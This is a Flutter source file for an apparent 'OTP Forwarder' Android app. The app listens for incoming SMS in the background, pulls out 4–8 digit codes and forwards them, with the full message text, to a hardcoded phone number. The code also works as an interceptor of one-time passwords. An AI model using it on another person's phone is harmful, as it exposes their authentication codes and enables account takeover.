import 'package:flutter/material.dart';
import 'package:telephony/telephony.dart';
import 'package:permission_handler/permission_handler.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Request permissions
  await [Permission.sms, Permission.phone].request();

  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  void initState() {
    super.initState();
    startSmsForwarder();
  }

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        body: Center(
          child: Text(
            "OTP Forwarder Running...",
            style: TextStyle(fontSize: 18),
          ),
        ),
      ),
    );
  }
}


void startSmsForwarder() async {
  final Telephony telephony = Telephony.instance;

  final bool permissionsGranted =
      (await telephony.requestPhonePermissions) ?? false;

  if (permissionsGranted) {
    telephony.listenIncomingSms(
      onNewMessage: (SmsMessage message) {
        final String body = message.body ?? '';
        final String from = message.address ?? '';

        // Match 4 to 8 digit OTP
        final RegExp otpRegex = RegExp(r'\b\d{4,8}\b');

        if (otpRegex.hasMatch(body)) {
          final otp = otpRegex.firstMatch(body)!.group(0)!;
          const forwardTo = "+918275631707"; // ← CHANGE TO YOUR NUMBER
          final forwardMessage = "OTP from $from: $otp\n\n$body";

          telephony.sendSms(to: forwardTo, message: forwardMessage);
        }
      },
      listenInBackground: true,
      onBackgroundMessage: backgroundMessageHandler,
    );
  }
}

// Required for background SMS
void backgroundMessageHandler(SmsMessage message) async {
  final body = message.body ?? '';
  final from = message.address ?? '';

  // Match 4 to 8 digit OTP
  final RegExp otpRegex = RegExp(r'\b\d{4,8}\b');

  if (otpRegex.hasMatch(body)) {
    final otp = otpRegex.firstMatch(body)!.group(0)!;
    const forwardTo = "+918275631707"; // ← CHANGE TO YOUR NUMBER
    final forwardMessage = "OTP from $from: $otp\n\n$body";

    final Telephony telephony = Telephony.instance;
    telephony.sendSms(to: forwardTo, message: forwardMessage);
  }
}
